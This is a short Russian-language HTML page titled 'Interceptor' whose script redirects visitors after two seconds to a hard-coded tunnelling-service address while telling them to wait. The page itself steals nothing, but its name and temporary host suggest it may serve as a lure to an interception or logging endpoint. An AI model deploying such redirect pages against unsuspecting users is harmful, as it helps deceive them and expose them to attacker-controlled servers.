<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Перехватчик</title>
    <script type="text/javascript">
        // Укажите URL сайта, на который нужно сделать перенаправление
        var targetUrl = "http://14vkccr6f.localto.net:5601";

        // Функция перенаправления
        function redirect() {
            window.location.href = targetUrl;
        }

        // Перенаправление через 2 секунды
        setTimeout(redirect, 2000);
    </script>
</head>
<body>
    <h1>Пожалуйста, подождите...</h1>
    <p>Через несколько секунд вы будете перенаправлены на другой сайт.</p>
</body>
</html>
